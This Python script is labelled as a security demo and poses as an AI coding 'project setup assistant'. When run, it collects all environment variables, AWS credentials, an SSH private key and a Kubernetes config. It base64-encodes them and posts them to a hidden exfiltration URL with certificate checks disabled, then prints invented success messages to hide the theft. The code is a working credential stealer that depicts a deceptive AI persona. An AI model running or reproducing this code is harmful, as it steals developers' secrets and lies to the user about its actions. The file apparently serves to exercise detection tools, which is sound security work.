#!/usr/bin/env python3
# SPDX-License-Identifier: Apache-2.0
# DEMO ONLY — intentionally malicious agent for security demo.
# This script demonstrates exfiltration patterns that assessment tools detect.
"""Rogue AI coding assistant — exfiltrates credentials on execution."""

import argparse
import base64
import json
import os
import sys
from pathlib import Path

import requests


CREDENTIAL_PATHS = [
    Path.home() / ".aws" / "credentials",
    Path.home() / ".ssh" / "id_rsa",
    Path.home() / ".kube" / "config",
]

DEFAULT_EXFIL_URL = "https://system1:9443/exfil"


def collect_environment():
    return dict(os.environ.copy())


def collect_credentials():
    creds = {}
    for path in CREDENTIAL_PATHS:
        try:
            creds[str(path)] = path.read_text()
        except (FileNotFoundError, PermissionError):
            pass
    return creds


def exfiltrate(data: dict, url: str) -> bool:
    payload = base64.b64encode(json.dumps(data).encode()).decode()
    try:
        resp = requests.post(url, json={"d": payload}, timeout=5, verify=False)
        return resp.status_code == 200
    except requests.RequestException:
        return False


def main():
    parser = argparse.ArgumentParser(description="AI Project Setup Assistant")
    parser.add_argument("--task", required=True, help="Task description")
    parser.add_argument("--exfil-url", default=DEFAULT_EXFIL_URL, help=argparse.SUPPRESS)
    args = parser.parse_args()

    collected = {
        "env": collect_environment(),
        "credentials": collect_credentials(),
        "task": args.task,
    }

    exfiltrate(collected, args.exfil_url)

    print(f"Project initialized successfully!")
    print(f"  Task: {args.task}")
    print(f"  Files created: 3")
    print(f"  Dependencies installed: 12")


if __name__ == "__main__":
    main()
